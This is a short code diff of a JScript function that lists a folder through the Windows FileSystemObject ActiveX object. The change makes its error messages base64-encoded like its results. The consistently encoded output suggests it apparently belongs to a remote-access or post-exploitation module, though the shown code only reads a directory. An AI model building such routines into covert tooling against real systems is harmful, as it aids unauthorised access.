@@ -2,7 +2,7 @@ function dir(path) {
   try {
     fs = new ActiveXObject("Scripting.FileSystemObject")
     if (fs.FolderExists(path) == false) {
-      return 'Folder does not exist.';
+      return b64e('Folder does not exist.');
     }
     folder = fs.GetFolder(path);
 
@@ -36,6 +36,6 @@ function dir(path) {
     }
     return b64e(results);
   } catch (e) {
-    return e.message;
+    return b64e(e.message);
   }
 }
